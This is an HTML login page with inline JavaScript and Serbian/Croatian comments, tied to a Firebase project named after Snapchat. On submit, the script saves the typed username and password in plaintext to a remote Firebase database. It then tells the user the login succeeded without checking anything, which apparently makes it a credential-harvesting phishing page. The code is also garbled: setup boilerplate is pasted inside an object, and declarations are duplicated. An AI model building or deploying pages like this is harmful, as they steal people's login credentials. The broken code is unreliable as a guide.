<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
</head>
<body>

    <h2>Login Form</h2>

    <!-- Forma za unos podataka -->
    <form id="loginForm">
        <label for="username">Username:</label><br>
        <input type="text" id="username" name="username" required><br><br>

        <label for="password">Password:</label><br>
        <input type="password" id="password" name="password" required><br><br>

        <button type="submit">Login</button>
    </form>

    <!-- Poruka za korisnika -->
    <p id="message"></p>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database.js"></script>

    <!-- Tvoj JavaScript kod -->
    <script>
        // Firebase konfiguracija
        const firebaseConfig = {
            // Import the functions you need from the SDKs you need
import { initializeApp } from "firebase/app";
import { getAnalytics } from "firebase/analytics";
// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyD68DJPIgjNlrblLKsgiYzDtjTx3oNZZG0",
  authDomain: "snapchat-a49be.firebaseapp.com",
  projectId: "snapchat-a49be",
  storageBucket: "snapchat-a49be.firebasestorage.app",
  messagingSenderId: "25223523241",
  appId: "1:25223523241:web:51375676285f0aab75f2b8",
  measurementId: "G-ZJL8QX9BHF"
        };

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);

        // Inicijalizacija Firebase-a
        const app = firebase.initializeApp(firebaseConfig);
        const database = firebase.database(app);

        // Funkcija za slanje podataka u Firebase
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault();

            let username = document.getElementById("username").value;
            let password = document.getElementById("password").value;

            // Provera da li su polja prazna
            if (username === "" || password === "") {
                document.getElementById("message").textContent = "Molimo vas da popunite oba polja!";
                return;
            }

            // Spremanje podataka u Firebase
            const userRef = database.ref("users").push(); // Dodavanje novog korisnika u bazu
            userRef.set({
                username: username,
                password: password
            });

            // Prikazivanje poruke korisniku
            document.getElementById("message").textContent = "Uspesno ste se prijavili!";
        });
    </script>

</body>
</html>
